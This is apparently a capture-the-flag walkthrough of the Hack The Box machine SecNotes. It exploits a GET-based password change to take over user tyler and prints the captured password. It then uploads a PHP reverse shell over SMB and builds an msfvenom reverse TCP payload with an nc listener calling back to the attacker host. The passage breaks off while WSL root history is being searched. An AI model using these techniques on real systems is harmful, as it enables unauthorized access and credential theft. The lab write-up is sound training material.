`Port` `8808` shows the default `IIS` site and `port` `80` shows a login form.

Create an account and log in.

There is a user named `tyler` that we can contact, and there is no protection against `XSS` when creating a note.

When changing the password, the request is also processed with `GET`, so we could send the request to change the password in the contact text with an `XSS`.

![](../assets/Pasted%20image%2020250518235204.png)

`XSS` is not needed, only send the URL and enter as `tyler` with the new password.

`tyler:92g!mA8BGjOirkL%OG*&`

Checking credentials and shares, we see that the user can write in a share.

## Initial Access

This is the root folder for `IIS`, so we can upload an `aspx`, `asp`, `config`, or `php` reverse shell.

Get a `PHP` rev shell and put it in the folder, start the listener, and browse the page.


```shell
$ smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //secnotes.htb/new-site
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (70.3 kb/s) (average 70.3 kb/s)
```


```shell
$ sudo rlwrap nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.97] 49913

C:\inetpub\new-site>whoami
iis apppool\newsite
```

The shell was unstable, so I put a web shell to get an `msfvenom` reverse shell.

![](../assets/Pasted%20image%2020250519002132.png)

```shell
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=80 -f exe -o reverse.exe

Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe

smb: \> put reverse.exe
putting file reverse.exe as \reverse.exe (56.0 kb/s) (average 29.5 kb/s)
```

## Privilege Escalation

Transfer `winPEAS` and find that `WSL` and `Ubuntu` are installed.

![](../assets/Pasted%20image%2020250519005409.png)

Go to the root folder of the distro and search `root`'s history.

```shell
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> type .bash_history
cd /mnt/c/
ls
